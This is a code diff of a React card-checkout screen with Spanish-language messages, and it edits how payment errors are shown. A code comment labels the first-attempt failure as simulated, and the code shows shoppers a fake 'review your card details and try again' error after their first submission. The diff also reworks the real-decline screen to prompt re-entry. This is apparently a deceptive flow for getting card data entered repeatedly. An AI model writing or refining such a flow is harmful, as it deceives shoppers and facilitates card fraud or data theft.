@@ -61,6 +61,8 @@ const CheckoutCartao = () => {
   const [loading, setLoading] = useState(false);
   const [showError, setShowError] = useState(false);
   const [tentativa, setTentativa] = useState(0);
+  // "revisar" = falha simulada da 1ª tentativa | "recusado" = recusa real Stripe/IronPay
+  const [erroTipo, setErroTipo] = useState<"revisar" | "recusado">("recusado");
   const pedidoCriadoId = useRef<string | undefined>(undefined);
   const [desafio3ds, setDesafio3ds] = useState<{ url: string; pedidoId: string } | null>(null);
   const [verificando3ds, setVerificando3ds] = useState(false);
@@ -239,6 +241,7 @@ const CheckoutCartao = () => {
   const handleSubmit = async () => {
     if (!isFormValid() || !clienteInfo) return;
 
+    setErroTipo("recusado");
     setLoading(true);
     try {
       const numeroLimpo = numeroCartao.replace(/\s/g, "");
@@ -311,6 +314,7 @@ const CheckoutCartao = () => {
         }
 
         setTentativa(1);
+        setErroTipo("revisar");
         setLoading(false);
         setShowError(true);
         return;
@@ -412,7 +416,7 @@ const CheckoutCartao = () => {
   }
 
   if (showError) {
-    const primeiraFalha = tentativa === 1;
+    const primeiraFalha = erroTipo === "revisar";
     return (
       <div className="min-h-screen bg-background max-w-md mx-auto flex flex-col items-center justify-center p-6">
         <div className="w-full text-center">
@@ -425,19 +429,28 @@ const CheckoutCartao = () => {
           <p className="text-muted-foreground text-sm mb-8">
             {primeiraFalha
               ? "Ha ocurrido un error. Revisa los datos de tu tarjeta e inténtalo de nuevo."
-              : "No ha sido posible procesar esta tarjeta. Prueba con otra forma de pago."}
+              : "No ha sido posible procesar esta tarjeta. Revisa los datos o prueba con otra tarjeta."}
           </p>
           <button
-            onClick={primeiraFalha ? () => setShowError(false) : handleTryAgain}
+            onClick={() => setShowError(false)}
             className="w-full py-3.5 font-semibold rounded-xl transition-all active:scale-[0.98]"
             style={{ background: accent, color: "#000" }}
           >
-            {primeiraFalha ? "Continuar" : "Probar otra forma"}
+            {primeiraFalha ? "Continuar" : "Intentar de nuevo"}
           </button>
+          {!primeiraFalha && (
+            <button
+              onClick={handleTryAgain}
+              className="w-full mt-3 py-3 text-sm font-medium text-muted-foreground hover:text-foreground transition-colors"
+            >
+              Probar otra forma de pago
+            </button>
+          )}
         </div>
       </div>
     );
   }
+
 
 
   if (loading && !usarStripeElements) {
